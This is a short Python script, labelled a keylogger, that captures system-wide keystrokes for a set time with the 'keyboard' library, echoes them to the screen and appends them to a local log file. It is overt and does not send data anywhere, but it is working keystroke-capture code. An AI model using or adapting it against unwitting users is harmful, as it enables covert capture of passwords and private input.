# keylogger: record keystrokes and save them to a file

import keyboard
import time

def keylogger(duration=10):
	print(f"Simulating keylogger for {duration} seconds (press ESC to stop)...")
	start_time = time.time()
	log_file = "keystrokes.log"

	with open(log_file, "a") as f:
		while time.time() - start_time < duration:
			try:
				# Record next key press
				event = keyboard.read_event(suppress=True)
				if event.event_type == "down":
					key = event.name
					f.write(f"{key}\n")
					print(f"Logged: {key}")

					# Exit if ESC is pressed
					if key == "esc":
						break
			except KeyboardInterrupt:
				break
	print(f"\nKeystrokes saved to {log_file}")
if __name__ == "__main__":
	keylogger(duration=20)
